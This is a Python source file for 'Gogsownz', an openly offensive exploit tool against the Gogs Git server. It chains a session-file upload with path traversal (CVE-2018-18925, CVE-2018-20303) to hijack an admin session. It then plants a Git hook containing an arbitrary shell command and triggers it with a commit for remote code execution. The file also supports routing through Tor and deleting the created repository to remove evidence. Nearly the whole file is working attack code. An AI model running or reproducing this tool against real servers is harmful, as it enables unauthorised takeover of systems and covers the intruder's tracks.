import requests
import re
from urllib.parse import unquote
import json
import argparse
import time

"""
Within Gogs there are 2 rules:
1) By default, go-macaron/sessions are stored serialized on file, unencrypted and unsigned.
2) Being admin on Gogs means RCE with Git Hooks.

Until those 2 rule will hold true, Gogsownz will stay alive.
"""

# Some versions have `macaron_flash` in some responses
EXTRA_COOKIES = ['_csrf', 'lang', 'macaron_flash']

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0'
}

if True:
    # For some versions
    HOOK_UPDATE_ENDPOINT = 'update'
else:
    # Other require this or they'll throw a 404
    HOOK_UPDATE_ENDPOINT = 'pre-receive'


class GogsException(Exception):
    pass


class Gogs:
    def __init__(self, baseurl, proxy=None, verbosity=0, insecure=False, checktor=False, cookiename=None, windows=False):
        self.verbosity = verbosity
        # 0: only essential informations
        # 1: some details
        # 2: print all
        self.baseurl = baseurl.rstrip()
        # TODO: url validation
        if self.baseurl[:4] != 'http':
            self.baseurl = 'http://' + self.baseurl
        if self.baseurl[-1] == '/':
            self.baseurl = self.baseurl[:-1]

        self.admin = False
        self.username = None

        if proxy == 'tor':
            self.session = self.get_tor_session()
        elif proxy == 'burp':
            self.session = self.get_burp_session()
        else:
            self.session = requests.Session()
        if insecure:
            self.session.verify = False
            requests.packages.urllib3.disable_warnings()
        self.session.headers.update(headers)
        self.session.cookies.set('lang', 'en-US')

        self.checktor = checktor
        self.cookie_name = cookiename
        self.windows = windows

    def start(self):
        if self.checktor:
            is_tor = self.check_tor()
            if not is_tor:
                raise GogsException("Tor isn't set up correctly")
            else:
                self.log(0, "Tor is ok")

        self.log(0, "Starting Gogsownz on: {}".format(self.baseurl))
        self.log(1, "Loading Gogs homepage")
        resp = self.get('/')

        regex = re.compile(r'(©(.*))Page:')
        match = regex.search(resp)
        if match is not None:
            self.gogsversion = match.group(1)
        else:
            raise GogsException('Not a Gogs website')
        if 'Version:' in self.gogsversion:
            self.log(0, "Gogs Version installed: {}".format(self.gogsversion))
        else:
            self.log(0, "Gogs Version is hidden. Footer info: {}".format(self.gogsversion))

        self.registrations = 'user/sign_up' in resp
        if self.registrations:
            self.log(0, "Registrations are enabled")

        self.require_signin = '<title>Sign In -' in resp
        if self.require_signin:
            self.log(0, "The Server is redirecting on the login page. Probably REQUIRE_SIGNIN_VIEW is enabled so you will need an account.")

        if self.cookie_name is None:
            cookies = [k for k in self.session.cookies.iterkeys()]
            cookies = list(filter(lambda x: x not in EXTRA_COOKIES, cookies))
            if len(cookies) != 1:
                raise GogsException("Can't find Gogs-specific session cookie")
            self.cookie_name = cookies[0]

    def log(self, severity, text):
        if self.verbosity >= severity:
            prefix = '[{}] '
            if severity == -1:
                prefix = prefix.format('!')
            elif severity == 1:
                prefix = prefix.format('+')
            elif severity == 2:
                prefix = prefix.format('@')
            else:
                prefix = prefix.format('i')
            print(prefix + text)

    def get_tor_session(self):
        session = requests.Session()
        # Tor uses the 9050 port as the default socks port
        session.proxies = {'http': 'socks5://127.0.0.1:9050',
                           'https': 'socks5://127.0.0.1:9050'}
        return session

    def get_burp_session(self):
        session = requests.Session()
        session.proxies = {'http': 'http://127.0.0.1:8080',
                           'https': 'https://127.0.0.1:8080'}
        session.verify = False
        requests.packages.urllib3.disable_warnings()
        return session

    def csrf_dance(self, page):
        regex = re.compile(r'<meta name="_csrf" content="(\S+)" />')
        match = regex.search(page)
        self.csrftoken = match.group(1) if match is not None else self.csrftoken
        self.log(2, "Got CSRF Token {}".format(self.csrftoken))

    def check_tor(self):
        req = self.session.get('https://check.torproject.org/api/ip')
        if req.status_code != 200:
            raise Exception("{}\n{}".format(req.status_code, req.text))
        return req.json().get("IsTor") is True

    def get(self, url, skip_csrf=False):
        req = self.session.get('{}{}'.format(self.baseurl, url))
        if req.status_code != 200:
            raise Exception("{}\n{}".format(req.status_code, req.text))
        if not skip_csrf:
            self.csrf_dance(req.text)
        return req.text

    def post(self, url, payload):
        req = self.session.post('{}{}'.format(self.baseurl, url), data=payload)
        if req.status_code != 200:
            raise Exception("{}\n{}".format(req.status_code, req.text))
        self.csrf_dance(req.text)
        return req.text

    def post_multipart(self, url, files, headers=None):
        req = self.session.post('{}{}'.format(self.baseurl, url), files=files, headers=headers)
        if req.status_code != 200:
            raise Exception("{}\n{}".format(req.status_code, req.text))
        self.csrf_dance(req.text)
        return req.text

    def login(self, username, password):
        payload = {
            'user_name': username,
            'password': password,
            'remember': 'on'
        }
        self.log(1, "Performing login")
        resp = self.post('/user/login', payload)
        self.username = username
        if self.username not in resp or "Username or password is not correct." in resp:
            raise GogsException("Can't log-in on the server. Maybe the supplied credentials are wrong?")
        self.log(1, "Logged in sucessfully as {}".format(username))

    def is_admin(self):
        return self.admin

    def is_loggedin(self):
        return self.username is not None

    def create_repo(self, repo_name='gogstest'):  # edit for m0r3 lulz
        resp = self.get('/repo/create')
        regex = re.compile('<input type="hidden" id="user_id" name="user_id" value="(\d+)" required>')
        match = regex.search(resp)
        uidname = 'user_id'
        if match is None:
            regex = re.compile('<input type="hidden" id="uid" name="uid" value="(\d+)" required>')
            match = regex.search(resp)
            uidname = 'uid'
            if match is None:
                raise GogsException("Can't create repository")
        self.log(1, "Got UserID {}".format(match.group(1)))
        user_id = match.group(1)
        payload = {
            '_csrf': self.csrftoken,
            uidname: user_id,
            'repo_name': repo_name,
            'private': 'on',
            'description': '',
            'gitignores': '',
            'license': '',
            'readme': 'Default',
            'auto_init': 'on'
        }
        resp = self.post('/repo/create', payload)
        if self.username not in resp:
            raise GogsException("Can't create repository")
        self.log(1, "Repository created sucessfully")
        return repo_name

    def upload_payload_attachment(self):
        # Thanks 5alt for the vuln
        # https://github.com/gogs/gogs/issues/5469
        self.log(0, "Exploiting pre-auth PrivEsc...")

        files = {'file': open('payload', 'rb')}
        headers = {
            'X-Requested-With': 'XMLHttpRequest',
            'X-Csrf-Token': unquote(self.csrftoken)
        }
        self.log(1, "Uploading admin session as attachment file")
        r = self.post_multipart('/releases/attachments', files, headers=headers)
        try:
            attch = json.loads(r).get('uuid')
        except json.decoder.JSONDecodeError:
            attch = None
        if attch is None:
            raise GogsException("Failed to upload attachment. Maybe the server is not vulnerable to CVE-2018-18925 ?")
        self.log(1, "Uploaded successfully, preparing cookies for the Path Traversal")
        attch = '../attachments/{}/{}/{}'.format(attch[0], attch[1], attch)
        if self.windows:
            attch = attch.replace('/', '\\')
        self.log(1, "Admin session hijacked, trying to login as admin")
        return attch

    def upload_payload_repo(self, repo_name):
        # Thanks snyff from PentesterLab for the vuln
        # https://github.com/gogs/gogs/issues/5558

        # Thanks LuckyC4t
        # https://github.com/gogs/gogs/commit/8c8c37a66b4cef6fc8a995ab1b4fd6e530c49c51
        self.log(0, "Exploiting authenticated PrivEsc...")

        content = open('payload', 'rb').read()
        old = self.session.cookies.get(self.cookie_name)
        sess = '{}001337'.format(old[:-6])  # edit for m0r3 sw4g

        payload = '../../../sessions/{}/{}/{}'.format(sess[0], sess[1], sess)
        if self.windows:
            payload = payload.replace('/', '\\')
        files = {'file': (payload, content)}

        headers = {
            'X-Requested-With': 'XMLHttpRequest',
            'X-Csrf-Token': unquote(self.csrftoken)
        }
        self.log(1, "Uploading admin session as repository file")
        r = self.post_multipart('/{}/{}/upload-file'.format(self.username, repo_name), files, headers=headers)
        try:
            attch = json.loads(r).get('uuid')
        except json.decoder.JSONDecodeError:
            attch = None
        if attch is None:
            raise GogsException("Failed to upload repository file. Maybe the server is not vulnerable to CVE-2018-20303 ?")
        self.log(1, "Uploaded successfully.")
        return attch, sess

    def commit_upload(self, repo_name, file_id):
        payload = {
            '_csrf': self.csrftoken,
            'tree_path': '',
            'files': file_id,
            'commit_summary': '',
            'commit_message': '',
            'commit_choice': 'direct',
            'new_branch_name': ''
        }
        self.log(1, "Committing the Admin session")
        resp = self.post('/{}/{}/_upload/master/'.format(self.username, repo_name), payload)
        if self.username not in resp:
            raise GogsException("Can't commit on repo {}/{}".format(self.username, repo_name))
        self.log(1, "Committed sucessfully")

    def set_githooks(self, repo_name, command):
        command = '#!/bin/sh\r\n' + command
        payload = {
            '_csrf': self.csrftoken,
            'content': command
        }
        self.log(1, "Setting Git hooks")

        resp = self.post('/{}/{}/settings/hooks/git/{}'.format(
            self.username, repo_name, HOOK_UPDATE_ENDPOINT), payload)

        if self.username not in resp:
            raise GogsException("Can't set Git hooks")
        self.log(1, "Git hooks set sucessfully")

    def commit_new(self, repo_name):
        page = self.get('/{}/{}/_new/master/'.format(self.username, repo_name))
        self.log(1, "Fetching last commit...")
        regex = re.compile(r'<input type="hidden" name="last_commit" value="(\S+)">')
        match = regex.search(page)
        if match is None:
            raise GogsException("Unable to get last commit for {}/{} repo".format(self.username, repo_name))
        last_commit = match.group(1)
        self.log(1, "Got last commit")
        payload = {
            '_csrf': self.csrftoken,
            'last_commit': last_commit,
            'tree_path': 'testdir',
            'content': 'testfile',
            'commit_summary': '',
            'commit_message': '',
            'commit_choice': 'direct',
            'new_branch_name': '',
        }
        self.log(1, "Triggering the RCE with a new commit")
        resp = self.post('/{}/{}/_new/master'.format(self.username, repo_name), payload)
        if self.username not in resp:
            raise GogsException("Can't commit on repo {}/{}".format(self.username, repo_name))
        self.log(1, "Committed sucessfully")
        self.log(0, "Performed RCE successfully")

    def remove_repo(self, repo_name):
        payload = {
            '_csrf': self.csrftoken,
            'repo_name': repo_name,
            'action': 'delete'
        }
        self.log(1, "Removing Repo evidences")
        resp = self.post('/{}/{}/settings'.format(self.username, repo_name), payload)
        if self.username not in resp:
            raise GogsException("Can't remove repo {}/{}".format(self.username, repo_name))
        self.log(1, "Repo removed sucessfully")

    def set_gogs_session(self, session_cookie):
        self.session.cookies.set(self.cookie_name, None)
        self.session.cookies.set(self.cookie_name, session_cookie)
        resp = self.get('/')
        regex = re.compile(r'Signed in as <strong>(\S+)</strong>')
        match = regex.search(resp)
        if 'href="/admin"' in resp:
            self.admin = True
        self.username = match.group(1)
        self.log(0, "Signed in as {}, is admin {}".format(self.username, self.is_admin()))
        self.log(0, "Current session cookie: '{}'".format(self.session.cookies.get(self.cookie_name)))

    def wait(self, seconds):
        self.log(0, "Waiting {} seconds before cleaning up...".format(seconds))
        time.sleep(seconds)

    def gather_info(self):
        # Function that gather info from /admin and /admin/config pages
        print("To be implemented")
        return


if __name__ == '__main__':
    parser = argparse.ArgumentParser(prog='gogsownz')
    parser.add_argument('-C', '--creds', dest='creds', nargs=1, help='Credentials for the Gogs server, in the from "username:password"')
    parser.add_argument('-n', '--cookie-name', dest='cookiename', nargs=1, help='Name of the Gogs-specific session cookie')
    parser.add_argument('-c', '--cookie', dest='cookie', nargs=1, help='Session for the Gogs server, the value in the i_like_gogits Cookie')
    parser.add_argument('-i', '--info', dest='info', action='store_true', default=False, help='Only detect informations about the running Gogs server, then quit')
    parser.add_argument('--rce', dest='rce', nargs=1, help='Command to execute on the Gogs server')
    parser.add_argument('--repo', dest='repo', nargs=1, default=None, help='Use an existing repo for the PrivEsc')
    parser.add_argument('--preauth', dest='preauth', action='store_true', help='Try the pre-auth vulnerability')
    parser.add_argument('--windows', dest='windows', action='store_true', help='Gogs server runs on Windows')
    parser.add_argument('--cleanup', dest='cleanup', action='store_true', help='Remove all created repo after exploit')
    parser.add_argument('--tor', dest='tor', action='store_true', help='Use tor proxy when performing requests')
    parser.add_argument('--check-tor', dest='checktor', action='store_true', help='Check that Tor is correctly set up before running')
    parser.add_argument('--burp', dest='burp', action='store_true', help='Use burp proxy when performing requests')
    parser.add_argument('-k', '--insecure', dest='insecure', action='store_true', help='Allow insecure server connections when using SSL')
    parser.add_argument('--verbose', '-v', action='count', default=0)
    parser.add_argument('url', type=str, nargs=1, help='URL for the Gogs server')
    args = parser.parse_args()

    proxy = ''
    if args.tor:
        proxy = 'tor'
    elif args.burp:
        proxy = 'burp'

    cn = None
    if args.cookiename:
        cn = args.cookiename[0]

    g = Gogs(args.url[0], proxy=proxy, verbosity=args.verbose, insecure=args.insecure, checktor=args.checktor, cookiename=cn, windows=args.windows)
    try:
        g.start()
    except requests.exceptions.ConnectionError as e:
        if e.args[0].reason.args[0] == 'Cannot connect to proxy.':
            g.log(-1, "Error connecting to the HTTP proxy")
            exit(21)
        elif 'SOCKS' in str(e.args[0].pool.__class__):
            g.log(-1, "Error connecting to the SOCKS5 proxy")
            exit(20)
        else:
            g.log(-1, "Error connecting to the supplied URL")
            exit(10)
    except GogsException as e:
        g.log(-1, e.args[0])
        exit(11)

    if args.creds:
        username, password = args.creds[0].split(':')[:2]
        try:
            g.login(username, password)
        except GogsException as e:
            g.log(-1, e.args[0])
            exit(12)
    elif args.cookie:
        g.set_gogs_session(args.cookie[0])

    if args.info:
        # if g.is_admin():
        #     g.gather_info()
        exit(0)

    if not g.is_admin():
        if args.preauth:
            # Thanks TheZero for the vuln
            # https://github.com/gogs/gogs/issues/5599
            try:
                sess = g.upload_payload_attachment()
            except GogsException as e:
                g.log(-1, e.args[0])
                exit(13)
        else:
            if not g.is_loggedin():
                g.log(-1, "You must supply a valid account for exploiting the Authenticated PrivEsc")
                exit(14)
            try:
                repo = args.repo[0] if args.repo else g.create_repo()
                file, sess = g.upload_payload_repo(repo)
                g.commit_upload(repo, file)
                if args.cleanup:
                    g.remove_repo(repo)
            except GogsException as e:
                g.log(-1, e.args[0])
                exit(15)
        # Let's try to apply the new session
        try:
            g.set_gogs_session(sess)
        except requests.exceptions.TooManyRedirects as e:
            print("Failed to upload session file. Probably the 'data/session/{}/{}' folder doesn't esists".format(sess[0], sess[1]))
            exit(16)

    # Here we must be admin, otherwise crash
    if not g.is_admin():
        g.log(-1, "Privilege Escalation failed. Seems that this Gogs is not vulnerable")
    # g.gather_info()

    if args.rce:
        try:
            repo = args.repo[0] if args.repo else g.create_repo()
            g.set_githooks(repo, args.rce[0])
            g.commit_new(repo)
            if args.cleanup:
                g.wait(10)
                g.remove_repo(repo)
        except GogsException as e:
            g.log(-1, e.args[0])
            exit(17)

    g.log(0, "Done!")
